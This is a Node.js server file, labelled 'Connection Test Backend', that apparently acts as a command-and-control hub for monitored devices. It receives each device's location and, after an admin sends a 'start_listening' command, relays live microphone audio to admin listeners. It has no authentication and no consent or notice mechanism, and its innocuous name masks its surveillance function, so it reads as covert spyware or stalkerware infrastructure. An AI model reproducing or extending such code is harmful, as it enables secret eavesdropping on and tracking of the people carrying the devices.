const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Serve admin at root when web-admin/index.html exists (e.g. local); else show backend message
const adminPath = path.join(__dirname, '..', 'web-admin');
const adminIndex = path.join(adminPath, 'index.html');
if (fs.existsSync(adminIndex)) {
  app.use(express.static(adminPath));
  app.get('/', (req, res) => res.sendFile(adminIndex));
} else {
  app.get('/', (req, res) =>
    res.send('<h1>Connection Test Backend</h1><p>API: <a href="/api/health">/api/health</a>. WebSocket at /ws. Use your local admin page and set Backend URL to this domain.</p>')
  );
}

const server = http.createServer(app);

// Store: deviceId -> { ws, lastLocation, streaming, adminWs }
const devices = new Map();
// Admin listeners: deviceId -> Set of admin WebSockets (to stream audio to)
const adminListeners = new Map();

const PORT = process.env.PORT || 4000;
const WS_PATH = '/ws';

const wss = new WebSocketServer({ server, path: WS_PATH });

wss.on('connection', (ws, req) => {
  const url = new URL(req.url || '', `http://${req.headers.host}`);
  const role = url.searchParams.get('role'); // 'device' | 'admin'
  const deviceId = url.searchParams.get('deviceId');

  if (role === 'device' && deviceId) {
    devices.set(deviceId, {
      ws,
      lastLocation: null,
      streaming: false,
      connectedAt: new Date().toISOString(),
    });
    console.log(`Device connected: ${deviceId}`);
    ws.on('message', (data) => {
      const msg = data.toString();
      if (msg.startsWith('{')) {
        try {
          const obj = JSON.parse(msg);
          if (obj.type === 'location') {
            const d = devices.get(deviceId);
            if (d) d.lastLocation = obj;
          }
        } catch (_) {}
        return;
      }
      // Binary or non-JSON: forward to admin listeners as audio
      const admins = adminListeners.get(deviceId);
      if (admins) {
        admins.forEach((adminWs) => {
          if (adminWs.readyState === 1) adminWs.send(data);
        });
      }
    });
    ws.on('close', () => {
      const d = devices.get(deviceId);
      if (d) d.streaming = false;
      devices.delete(deviceId);
      adminListeners.delete(deviceId);
      console.log(`Device disconnected: ${deviceId}`);
    });
    return;
  }

  if (role === 'admin' && deviceId) {
    if (!adminListeners.has(deviceId)) adminListeners.set(deviceId, new Set());
    adminListeners.get(deviceId).add(ws);
    ws.on('close', () => {
      const set = adminListeners.get(deviceId);
      if (set) {
        set.delete(ws);
        if (set.size === 0) adminListeners.delete(deviceId);
      }
    });
    // Tell device to stop streaming when admin disconnects
    ws.on('close', () => {
      const d = devices.get(deviceId);
      if (d && d.ws.readyState === 1) {
        d.ws.send(JSON.stringify({ action: 'stop_listening' }));
        d.streaming = false;
      }
    });
    return;
  }

  ws.close();
});

// REST: list devices
app.get('/api/devices', (req, res) => {
  const list = [];
  devices.forEach((d, id) => {
    list.push({
      deviceId: id,
      connected: d.ws.readyState === 1,
      streaming: d.streaming,
      lastLocation: d.lastLocation,
      connectedAt: d.connectedAt,
    });
  });
  res.json(list);
});

// REST: send command to device
app.post('/api/devices/:deviceId/command', (req, res) => {
  const { deviceId } = req.params;
  const { action } = req.body || {};
  const d = devices.get(deviceId);
  if (!d || d.ws.readyState !== 1) {
    return res.status(404).json({ error: 'Device not connected' });
  }
  if (action === 'start_listening') d.streaming = true;
  if (action === 'stop_listening') d.streaming = false;
  d.ws.send(JSON.stringify({ action: action || 'ping' }));
  res.json({ ok: true, action });
});

// REST: get last known location
app.get('/api/devices/:deviceId/location', (req, res) => {
  const d = devices.get(req.params.deviceId);
  if (!d) return res.status(404).json({ error: 'Device not found' });
  res.json(d.lastLocation || { error: 'No location yet' });
});

// Health
app.get('/api/health', (req, res) => res.json({ ok: true }));

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
  console.log(`WebSocket: ws://0.0.0.0:${PORT}${WS_PATH}`);
});
